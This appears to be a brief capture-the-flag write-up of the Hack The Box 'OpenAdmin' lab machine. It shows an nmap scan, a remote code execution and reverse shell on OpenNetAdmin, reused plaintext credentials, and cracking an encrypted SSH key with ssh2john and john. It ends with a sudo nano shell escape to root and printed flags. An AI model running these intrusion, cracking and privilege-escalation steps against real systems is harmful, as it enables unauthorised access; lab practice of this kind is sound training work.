+++
title = "HTB - OpenAdmin"
date = 2024-10-18
+++

### Scan
```
└─# nmap -sV -sC -p- --open 10.10.10.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 21:39 EDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.40% done; ETC: 21:40 (0:00:15 remaining)
Nmap scan report for 10.10.10.171
Host is up (0.12s latency).
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.41 seconds
```
Login portal on music
Ona-Rce. Dive into script and whats happening.
Once accessed, create a python callout for revshell in test.py, then set up listener to catch. Stabilize
Once set as www-data, netstat shows mysql on 3306, meaning a db is somewhere. It's found at /var/www/html/ona/local/config
Find a password: `n1nj4W4rri0R!` | we can SSH spray or parse the other config files to realize this is jimmy's
We now have access to sites enables in the /etc/apache dir. When we look at the details of the internal site, we find a listener on 52846. Lets ssh in while forwarding the port
`ssh -L 52846:localhost:52846 jimmy@10.10.10.171`
Then, visit the website on our machine. SSH must complete before this works.
http://localhost:52846/
We are greeted with a login page. 
When we root around a bit more in the internal.conf in /etc/apache2/site-enabled, we notice the root is /var/www/internal
When looking there we find php files. cating our each one, we find a sha512 password hash in index.php
Crackstation helps us out, and we find the passowrd is `Revealed`
We get an RSA Private Key, lets try it on joanna. Doesnt work. We find out its encrypted
Theres a tool called ssh2john for this. Lets pass it there
`ssh2john rsa.txt > rsahash.txt`
Now pass it to john
`john --wordlist=/usr/share/wordlists/rockyou.txt rsahash.txt`
We get a crack on `bloodninjas`
Let's rewrite the key using
`openssl rsa -in rsa.txt -out joanna.hash`
Now we can ssh in
`ssh -i joanna.hash joanna@10.10.10.171`
USER: 9f26b3bd08fafb00ef7bb9f841d1f9c5
sudo -l for information. We see that we've got access to nano
GTFOBINS ftw. 
`sudo [command with access to]`
Then, we'll `CTRL+R` to switch to read mode, and `CTRL+X` to execute commands.
Then we'll spawn a shell `/bin/sh 1>&0 2>&0`
ROOT: ddbf94a7de205d45ddfae5fee128c702
